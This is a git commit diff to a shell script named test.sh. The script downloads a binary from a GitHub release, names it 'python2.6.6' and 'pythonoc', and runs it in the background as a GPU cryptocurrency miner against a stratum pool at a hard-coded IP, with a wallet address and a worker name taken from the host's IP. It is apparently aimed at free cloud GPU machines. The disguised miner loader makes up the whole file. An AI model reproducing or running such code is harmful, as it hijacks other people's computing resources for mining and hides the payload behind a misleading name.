85e77da3525112a52b658562d8a54e859770619e
Ayoub Jadouli <Ayoub JADOULI>
2021-04-03 20:07:38 +0100

    test 24

--- test.sh
+++ test.sh
@@ -6,22 +6,22 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 23 ########################'
+echo '##################### Test N 24 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
 wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
 chmod +x python2.6.6
-cp python2.6.6 /bin/pythonoc
+cp python2.6.6 pythonoc
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
     ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8  --cuda-block-size 256   --cu-schedule auto --cuda-streams 4 --cuda-grid-size 16384 >> oout &
     ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 >> oout &
-    tail -f oout
+    
 else
     ./pythonoc -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 >> oout &
     ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 >> oout &
-    tail -f oout
 
 fi
+tail -f oout
